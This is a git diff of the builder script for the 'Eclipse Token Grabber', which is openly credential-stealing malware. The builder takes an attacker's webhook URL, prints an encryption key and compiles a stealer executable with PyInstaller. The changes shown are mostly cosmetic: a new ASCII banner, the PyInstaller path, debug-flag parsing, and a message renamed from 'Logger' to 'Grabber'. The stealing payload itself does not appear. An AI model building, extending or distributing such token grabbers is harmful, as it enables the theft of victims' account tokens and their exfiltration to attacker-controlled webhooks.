@@ -1,5 +1,4 @@
 import os
-
 from os import remove as delete_file, path
 from tokenize import Name
 from turtle import clear
@@ -26,15 +25,15 @@ start_banner = F'''{ly}
                                                ,o8888888'
                          ,:o:o:oooo.        ,8O88Pd8888"
                      ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"
-                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"
-                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"
-                 , ..:.::o:ooOoOO8O888O8O,COCOO"
-                , . ..:.::o:ooOoOOOO8OOOOCOCO"
-                 . ..:.::o:ooOoOoOO8O8OCCCC"o
-                    . ..:.::o:ooooOoCoCCC"o:o
+                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"            ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
+                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"              ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+                 , ..:.::o:ooOoOO8O888O8O,COCOO"                █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
+                , . ..:.::o:ooOoOOOO8OOOOCOCO"                  ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+                 . ..:.::o:ooOoOoOO8O8OCCCC"o                   ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
+                    . ..:.::o:ooooOoCoCCC"o:o                   ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                     . ..:.::o:o:,cooooCo"oo:o:
-                 `   . . ..:.:cocoooo"'o:o:::'                     {re}Authors{ly}:{re} Dimitris Kalopisis {ly}|{re} Yuliy Mitryashkin{ly} |{re} George Prepakis{ly}
-                 .`   . ..::ccccoc"'o:o:o:::'                      {re}Twitter{ly}:{re} {oa}@{re}Dkalopisis        {ly}|{re} {oa}@{re}JM1k1{ly}            |{re} {oa}@{re}kerag0{ly}
+                 `   . . ..:.:cocoooo"'o:o:::'                              {re}Authors{ly}:{re} Dimitris Kalopisis {ly}|{re} Yuliy Mitryashkin{ly} |{re} George Prepakis{ly}
+                 .`   . ..::ccccoc"'o:o:o:::'                               {re}Twitter{ly}:{re} {oa}@{re}Dkalopisis        {ly}|{re} {oa}@{re}JM1k1{ly}            |{re} {oa}@{re}kerag0{ly}
                 :.:.    ,c:cccc"':.:.:.:.:.'
               ..:.:"'`::::c:"'..:.:.:.:.:.'
             ...:.'.:.::::"'    . . . . .'
@@ -43,7 +42,7 @@ start_banner = F'''{ly}
          .. . ."'     
         .
 
-{oa}------------------------------------------------------------------{re}
+{oa}------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------{re}
 
 '''
 
@@ -80,7 +79,7 @@ def build(webhook: str, out_file: str, debug: bool):
     if OS == "linux" or OS == "linux2":  # Linux
         compile_command = ["wine", "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/" + "Python/Python38-32/Scripts/pyinstaller.exe"]
     elif OS == "win32":  # Windows
-        compile_command = ["pyinstaller"]
+        compile_command = ["venv/Scripts/pyinstaller.exe"]
     elif OS == "darwin":  # OSX
         compile_command = ["pyinstaller"]
     else:
@@ -135,7 +134,7 @@ def get_args() -> Namespace:
     parser = ArgumentParser(description='Eclipse Token Grabber Builder')
     parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
     parser.add_argument('-o', '--filename', help='name your executable', default='', required=True)
-    parser.add_argument('-d', '--debug', help='enable debug mode', default='', required=False, action='store_true')
+    parser.add_argument('-d', '--debug', help='enable debug mode', nargs='?', const=True, default=False)
     clear_screen()
     print(start_banner)
     return parser.parse_args()
@@ -147,7 +146,7 @@ def main(args: Namespace):
     print(f"[🔒] Encryption Key: {fernet_key}")
     print(f"[🏗️] Building the Token Grabber, please wait. . .")
     build(args.webhook, args.filename, args.debug)
-    print(f"[🧳] Successfully Built the Logger!\n")
+    print(f"[🧳] Successfully Built the Grabber!\n")
 
 
 if __name__ == "__main__":
